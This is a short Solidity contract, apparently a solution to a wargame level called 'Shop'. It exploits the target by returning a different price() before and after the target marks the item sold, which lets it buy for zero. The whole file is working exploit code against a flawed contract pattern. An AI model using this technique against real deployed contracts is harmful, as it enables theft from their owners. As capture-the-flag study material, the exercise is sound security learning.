// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;

import "./21_Shop.sol";

contract ShopAttack {
    Shop target;

    constructor(address payable _target) public {
        target = Shop(_target);
    }

    function buy() public {
        target.buy();
    }

    function price() public view returns (uint256) {
        if (target.isSold()) {
            return 0;
        } else {
            return 100;
        }
    }
}
